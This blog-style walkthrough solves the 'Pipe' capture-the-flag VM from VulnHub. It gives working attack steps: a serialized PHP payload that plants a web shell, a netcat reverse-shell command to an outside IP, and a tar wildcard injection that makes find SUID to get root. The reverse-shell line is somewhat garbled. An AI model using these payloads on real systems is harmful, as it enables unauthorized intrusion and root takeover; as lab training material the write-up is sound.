@@ -1,0 +1,296 @@
+
+								
+																		Hack the Pipe VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on January 28, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “PIPE” of the vulnhub lab’s design by Mr. Sagi. The level of this challenge is not so tough and its difficulty level is labeled as a medium. Solving this lab will give you a good experience of penetration testing.
+You can download it from here: https://www.vulnhub.com/entry/devrandom-pipe,124/
+
+Penetrating Methodologies:
+Network Scanning (Nmap, Netdiscover)
+Abusing HTTP service (Burp Suite)
+Exploiting js serialization for remote code execution
+Insert netcat reverse_shell payload
+Spawn TTY shell
+Wildcard privilege escalation
+capture the flag
+
+Let’s Begin!!
+Start with the netdiscover command to identify target IP in the local network, in my network 192.168.1.104 is my target IP, you will get yours.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Further, let’s enumerate open ports and protocols information of the target’s network with help of nmap following command:
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.104 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.104 --open
+					
+				
+			
+		
+
+And from here we get open ports 22, 80, 111, 54073
+
+Now we will open target IP in the browser as port 80 is active. Here the website reflects off unauthorized message with a login page. On the login window, it written “the site says: index.php” which we will be using later on.
+
+Now using burpsuite we are going to capture the cookies for login page by setting manual proxy of Firefox browser. It has intercepted data for the login page. Here we will change the HTTP-GET method into HTTP-POST.
+
+As shown in the below image replace GET from POST/index.php and then forward the intercepted request.
+
+Ok! To above step leads us to a website which shows a PIPE picture and a link below it to get Show artist info.
+
+As we cannot see anything else on this web page so we opened the page source code. It shows an accessible directory scriptz/php.js in its script content.
+
+Now open target IP with /scriptz in the browser, and you will notice some file or scripts are present here. Download both files for further enumeration.
+
+So first we open php.js file here we found it is serializing some data and after that, we open log.php.bak which works with the js file for serialization.
+Then I search in Google and found Deserialization vulnerabilities in JS 
+
+Now again returning to our original web page, and click on the link given below of the Pipe image and capture cookies that request in a burp.
+
+Select the parameter and send it for decoding in the smart decoder, in the image below red highlighted text is decoded and the result is shown in below window the code which is given in bottom window need to be altered so that we can upload our malicious code.
+
+Now modify the param with the following code for remote code execution and then forward the request.
+
+		
+		
+			
+			
+			
+			
+O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}
+			
+				
+					
+				
+					1
+				
+						O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}
+					
+				
+			
+		
+
+
+Check your shell.php file is uploaded in that accessible directory.
+
+Now we have uploaded shell it’s time to open it see what it gives us. As we have executed the code for cmd, we will type cmd in URL as well.
+cmd=id
+It will dump the id of current user i.e. www-data.
+
+Now let’s try to spawn tty shell of the victim’s machine with help of netcat payload: nc 10.0.0.1 1234 -e /bin/bash 192.168.1.107 1234
+
+Then start netcat listener and then execute the payload to spawn tty shell of victim’s machine.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+			
+				
+					
+				
+					1
+				
+						nc -lvp 1234
+					
+				
+			
+		
+
+As you can observe we have successfully compromised the target machine and run the following command for gaining root access.
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty; pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty; pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Then we check for any cronjobs running on the system via cat command we can see a couple of cron jobs running which interest us. In /etc/crontab the script /usr/bin/compress.sh which is world readable now follow the below steps
+
+		
+		
+			
+			
+			
+			
+cat /etc/crontab
+cat /usr/bin/compress.sh
+			
+				
+					
+				
+					12
+				
+						cat /etc/crontabcat /usr/bin/compress.sh
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cd /home/rene/backup
+ls
+echo "chmod u+s /usr/bin/find" &gt; test.sh
+echo "" &gt; "--checkpoint-action=exec=sh test.sh"
+echo "" &gt; --checkpoint=1
+ls -al /usr/bin/find
+touch raj
+find raj -exec "/bin/sh" \;
+			
+				
+					
+				
+					12345678
+				
+						cd /home/rene/backuplsecho "chmod u+s /usr/bin/find" &gt; test.shecho "" &gt; "--checkpoint-action=exec=sh test.sh"echo "" &gt; --checkpoint=1ls -al /usr/bin/findtouch rajfind raj -exec "/bin/sh" \;
+					
+				
+			
+		
+
+Yuppie!! We got the root access.
+
+At last open, the flag.txt file and we have our flag.
+Mission accomplished!
+
+Author: Yugam Yadav is a passionate Researcher and Technical Writer at Hacking Articles. he is a hacking enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
